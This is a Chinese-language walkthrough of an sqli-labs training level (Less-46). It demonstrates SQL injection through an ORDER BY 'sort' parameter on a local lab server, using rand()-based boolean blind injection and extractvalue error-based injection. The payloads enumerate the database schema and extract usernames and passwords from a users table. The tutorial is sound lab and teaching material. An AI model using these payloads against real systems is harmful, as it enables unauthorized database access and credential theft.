sql-labs-Less-46~49

Less-46

进入http://127.0.0.1/sql/Less-46/，显示如下；


和之前的关卡有点不一样。这关我们要输入?sort=1，


没有什么报错信息，应该是正常输出。
我们输入?sort=4时，发生报错：


显示说有未知的列，说明这可能和列有关，再分别输入?sort=2、?sirt=3：


发现相应的列都进行了从小到大的排列。这和order by的作用很想，所以可能和order by有关。
再分别输入desc（从大到小排）和asc（从小到大排），如果显示结果不同，则表明可以注入。
我们输入?sort=1’，发生报错：


里面只有一个’被一对’括起来，说明无注入字符。
输入http://127.0.0.1/sql/Less-46/?sort=3 and left(database(),1)=’a’，正常输出，说明不能用布尔盲注。但是可以用rand()函数进行布尔盲注。
输入http://127.0.0.1/sql/Less-46/?sort=1 union select 1，报错，说明不能用联合注入。
因为报错了，所以可以用报错注入，也可以用延时注入。


构造语句：
1)直接添加注入语句，?sort=(select **)
2)利用一些函数。例如 rand()函数等。?sort=rand(sql语句)
3)利用 and，例如?sort=1 and (加sql语句)

这里先演示后两种：
2)rand()函数
先看一下rand的一些性质：


这里可以看到true和false的排序是不一样的，所以我们可以把盲注常用语句放到里面进行布尔盲注。
爆库：http://127.0.0.1/sql/Less-46/?sort=rand(left(database(),1)>=0x61 and left(database(),1)<=0x7a)–+
爆表：http://127.0.0.1/sql/Less-46/?sort=rand(left((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),1) >= 0x61 and left((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),1) <= 0x7a)–+
爆列：http://127.0.0.1/sql/Less-46/?sort=rand(left((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1) >= 0x61 and left((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1) <= 0x7a)–+
爆字段：http://127.0.0.1/sql/Less-46/?sort=rand(ascii(left((select id from users limit 0,1),1)) >= 20 and ascii(left((select id from users limit 0,1),1)) <=126)–+
http://127.0.0.1/sql/Less-46/?sort=rand(ascii(left((select username from users limit 0,1),1)) >= 20 and ascii(left((select username from users limit 0,1),1)) <=126)–+
http://127.0.0.1/sql/Less-46/?sort=rand(ascii(left((select password from users limit 0,1),1)) >= 20 and ascii(left((select password from users limit 0,1),1)) <=126)–+

PS：里面0x开头的是16进制，可以在hackbar里进行反转码，不要选中0x

3)and 报错/延时
爆库：http://127.0.0.1/sql/Less-46/?sort=1 and extractvalue(1,concat(0x7e,database()))–+
爆表：http://127.0.0.1/sql/Less-46/?sort=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’)))–+
爆列：http://127.0.0.1/sql/Less-46/?sort=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’)))–+
爆字段：http://127.0.0.1/sql/Less-46/?sort=1 and extractvalue(1,concat(0x7e,(select id from users limit 0,1)))–+
http://127.0.0.1/sql/Less-46/?sort=1 and extractvalue(1,concat(0x7e,(select username from users limit 0,1)))–+
http://127.0.0.1/sql/Less-46/?sort=1 and extractvalue(1,concat(0x7e,(select password from users limit 0,1)))–+
